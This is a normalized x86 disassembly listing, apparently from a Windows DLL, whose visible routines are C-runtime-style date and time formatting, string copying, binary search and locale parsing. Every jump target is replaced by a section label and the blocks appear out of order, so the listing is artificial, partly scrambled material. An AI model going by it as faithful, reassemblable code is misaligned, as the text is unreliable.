cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0xc
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_100200e0
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
push edi
call sub_100200e0
add [ ebp - 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
dec [ ebp - 0x14 ]
pop ecx
lea edi [ edi + eax + 0x1 ]
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
mov eax [ ebp - 0xc ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_100200e0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
push edi
call sub_100200e0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
push edi
call sub_100200e0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
push edi
call sub_100200e0
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
sub_1002eb1f
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_1002eb3f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_1002ebba
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
cmp eax 0x59
push esi
push edi
mov ebx ecx
mov esi edx
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x5a
je r-xdata
call sub_10026065
xor edi edi
jmp r-xdata
cmp eax 0x1fa3
jle r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
call sub_10026065
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_10033738
call sub_100333b9
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
mov ecx ebx
setne al
mov ebx eax
mov edx [ edx + ebx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax 0x7
je r-xdata
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
sub eax 0x4
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xb
mov edx [ ebp + 0x10 ]
jg r-xdata
cmp eax 0x6
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
call sub_1002eb1f
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
pop edx
xor edi edi
cmp eax edi
jl r-xdata
mov eax [ esi ]
dec eax
dec eax
je r-xdata
cmp eax 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push edi
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
cmp eax 0x3b
jmp r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
dec eax
je r-xdata
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
cmp eax edi
jne r-xdata
sub eax 0x18
je r-xdata
mov ecx [ ebp + 0xc ]
mov edi ebx
call sub_1002eb3f
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1002efa2
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push ecx
pop eax
jmp r-xdata
mov eax [ ebx ]
mov [ eax ] 0x25
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
jmp r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
jmp r-xdata
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1002efa2
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] edi
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
xor edi edi
cmp esi edi
jl r-xdata
cmp eax 0x16d
jg r-xdata
cmp eax edi
je r-xdata
push ebx
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebx ]
push [ ebp + 0x10 ]
mov [ eax ] 0x20
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
push eax
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
cmp eax edi
jl r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_1002efa2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x1c ]
xor ebx ebx
sub eax ebx
push edi
je r-xdata
mov edi [ esi + 0xa0 ]
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x2
mov ecx [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ esi + 0xa4 ]
jmp r-xdata
mov edi [ esi + 0xa8 ]
jmp r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov edx 0x76c
add dx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x20 ] dx
mov dx [ eax + 0x10 ]
inc dx
mov [ ebp - 0x1e ] dx
mov dx [ eax + 0xc ]
mov [ ebp - 0x1a ] dx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x18 ] dx
mov dx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x14 ] ax
push ebx
xor eax eax
push edi
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ esi + 0xac ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x16 ] dx
call ecx
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
mov ecx [ GetTimeFormatA@IAT ]
cmp [ esi + 0xb0 ] 0x1
mov eax [ ebp + 0x10 ]
je r-xdata
xor edx edx
mov [ ebp - 0x8 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xc ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_10022f32
pop ecx
cmp eax ebx
je r-xdata
call sub_100303a0
mov eax esp
cmp eax ebx
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x10 ]
mov ebx eax
push ebx
push edi
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push [ esi + 0xac ]
call [ ebp - 0xc ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x8 ]
call sub_10026507
pop ecx
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov ecx esi
push ebx
push [ ebp + 0x8 ]
call sub_1002ebba
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_10033787
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov edx [ ecx ]
mov [ ebp - 0x10 ] eax
mov al [ ebx ]
mov [ edx ] al
inc [ ecx ]
mov eax [ ebp - 0x10 ]
inc ebx
dec [ esi ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn
push [ ebp + 0x8 ]
push ecx
call sub_10030985
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp + 0x1c ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_10033787
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
mov eax edx
dec eax
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_10030985
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp + 0x8 ]
push eax
call sub_10030985
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_10030985
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov al 0x42
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
sub_1002f403
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_10023358
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_10026065
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_10030985
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov al [ esi ]
lea ecx [ ebp + 0x8 ]
call sub_1002ebba
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_1002f5a7
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002f403
add esp 0x18
pop ebp
retn
sub_1002f5c7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_10026065
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
sub_1002f63b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_10026065
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
sub_1002f6f0
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_10033895
pop ecx
pop ecx
test eax eax
jne r-xdata
jge r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_1002f752
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
test esi esi
je r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_100232d0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
lea esi [ ebp - 0xc ]
call [ GetACP@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10020040
leave
retn
push r--data
push esi
call sub_100232d0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_100338e7
pop ecx
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0xb
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_1002f7f6
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
inc eax
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1002f81a
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov al cl
sub al 0x61
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
shl esi 0x4
lea esi [ esi + eax - 0x30 ]
add cl 0xf9
sub_1002f84e
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_1002f869
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10027e84
mov esi eax
mov edx edi
add esi 0x9c
call sub_1002f81a
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_10033895
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_1002f7f6
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10020040
leave
retn 0x4
or [ esi + 0x8 ] 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
sub_1002f901
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x3ff
push 0x1
or eax 0x400
push eax
mov esi ecx
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x7c ]
call sub_1002f81a
cmp [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10020040
leave
retn
mov esi [ esi ]
push edi
mov edx esi
call sub_1002f84e
push esi
